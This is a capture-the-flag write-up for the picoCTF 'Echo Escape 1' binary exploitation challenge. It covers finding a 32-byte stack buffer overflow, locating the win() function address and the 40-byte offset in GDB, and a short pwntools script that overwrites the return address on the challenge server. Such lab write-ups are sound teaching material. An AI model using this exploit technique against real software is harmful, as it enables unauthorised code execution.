# Writeup: Echo Escape 1 - picoCTF 2026

**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Author:** YAHAYA MEDDY  

## 1. Challenge Description

The challenge is a "secure" echo service. When connecting via netcat:

![Challenge description on picoCTF](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/6845169101721a9f385ee67203574c928e7edf34/pwn1.png)

Actual connection:

![Netcat connection and initial interface](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn2.png)

Let's try to input some data to see the program's output:

![Testing the program](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn3.png)

**Observation:** The program responds with the string "Hello" combined with the data we just entered, followed by a termination message.

## 2. Downloading Binary and Preparation

Download the executable file (binary) to your local environment for technical analysis.

![Challenge details and copy link button](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn4.png)

*Copy the download link for the binary file.*

![Using wget to download binary](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn5.png)

*Use the wget command to download the binary file.*

![Running chmod +x vuln.6](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/chaylocal.png)

*Next, we use the command `chmod +x <binary_filename>` to grant execution permissions on our machine.*


---

## 3. Source Code Analysis

Source code provided:

![Source code vuln.c](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/sourcecodepwn.png)

Analyzing the code, we can see that the program only allocates a 32-byte buffer but allows the user to input a maximum of up to 128 bytes.

This is a clear sign of a **Stack Buffer Overflow**.

You can visualize it like a glass being overfilled; the water gradually spills over into other areas. In this challenge, it's the same.

Our goal is to figure out how to make our data bytes overwrite the exact position of the `win` function to read the flag.

![Buffer Overflow Illustration](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmEs0fL8NkDoIMjOlkwFWk4YMrjF2YB4YGGw&s)

*This is an illustration of the buffer overflow vulnerability we are exploiting.*

## 4. Debugging with GDB and Pwndbg

**First and foremost, we use the command "file ./<binary_filename>" to check the binary's configuration.**

After executing this command, we can see basic parameters such as: Name, Format (ELF), Architecture (64-bit), Byte Order (LSB), Instruction Set (x86-64), and most importantly, **not stripped**.

When a file is not stripped, we can easily locate functions like 'main' or 'win'.

![Checking file configuration](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/checkbit.png)

Next, we inspect the program using GDB with the command `gdb ./<binary_filename>`.

![Opening vuln.6 with GDB](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn7.png)

We use `checksec` to see which security layers are enabled on the binary.

![checksec](https://github.com/Writeup-Challenge-Le-Nam-Thang/Pwn-Picoctf/blob/329acef68c463e8fcea5890be5aaf7223c4897da/checksec.png)

**How lucky!**

We can see that this file has no PIE protection, meaning the address of the `win` function will be at a fixed location and will not change during execution.

![List of functions in binary](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn8.png)

Knowing which functions the program uses is vital. We can view all functions in GDB using the `info function` command.

Next, we find the address of the `win` function by executing `p win` in GDB.

![Finding win address](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn9.png)

After scanning, we get the `win` function address:
**win() address = 0x401256**

## 5. Finding the Offset to the Return Address

As analyzed above, this looks like a buffer overflow, so we will create a string longer than the buffer to crash the program.

Using the command `cyclic 200`, we generate 200 random characters to input into the program.

![Creating cyclic pattern 200 bytes](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn10.png)

Copy the string, paste it, and press Enter to see what happens.

![Running binary with cyclic pattern](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn11.png)

Hehe, just as predicted! After running the long string, the program crashed and printed a value that "overflowed" into GDB's records.

This is the value of the **RIP Register** (Instruction Pointer) at the time of the crash (Segmentation Fault).

![Value of Register RIP](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn12.png)

To find the exact offset:

What is an **Offset**? Simply put, it's the "distance" (in bytes) from the start of the buffer to the position of the Return Address on the Stack.

We use the command `cyclic -l <RIP_value>` to find the offset.

![Using cyclic -l to find offset](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/pwn13.png)

**Result:** Offset = **40 bytes**

## 6. Writing the Exploit Script

Now for my favorite and most interesting part: using the **pwntools** library in Python to write the payload to get the flag.

Here is the content of our exploit file:

```python
from pwn import *

HOST = "mysterious-sea.picoctf.net" # Server hostname
PORT = 12345 # Replace with your challenge port

p = remote(HOST, PORT) # Connect to the challenge server

p.recvuntil(b"Please enter your name: ") # Wait for the prompt before sending payload

offset = 40 # Offset found using cyclic
win_addr = 0x401256 # win function address

# Creating the payload:
# 40 bytes of junk + the win function address packed as a 64-bit integer
payload = b"A" * offset + p64(win_addr) 

p.sendline(payload) # Send the payload
p.interactive() # Switch to interactive mode to see the result
```
Let's break down the payload:

```
HOST = "mysterious-sea.picoctf.net" # Lab server hostname
PORT = 12345 # Lab service port
p = remote(HOST, PORT) # Open TCP connection
```
These lines establish the connection to communicate with the challenge server

```p.recvuntil(b"Please enter your name: ")```

Listens to server data and waits for the "name" request to ensure we don't send data too early

```
offset = 40 
win_addr = 0x401256
payload = b"A" * offset + p64(win_addr)
```
This is the core of our attack:

b"A" * 40: 40 junk characters to fill the buffer and reach the return address position.

p64(win_addr): Converts the win address (0x401256) into 64-bit byte format (Little Endian). (Note: If the binary was 32-bit, you must use p32!)
```
p.sendline(payload) # Send payload
p.interactive()     # Keep connection open
```
These two command use to Sends the payload and allows us to read the Flag returned by the server

## 7. Running your Payload to get the Flag
***Note: You must keep the payload script and the binary file in the same directory.***

Run the command python3 <payload_filename>.py and let the script do its work.

Finally, after execution, the flag will appear:

TADA!!!!!! HERE IS OUR FLAG!

![FLAG](https://github.com/tha-lo-rien/Pwn-Picoctf/blob/4d3063d4dc3044eef990c713d5222fff7260d899/flag.png)




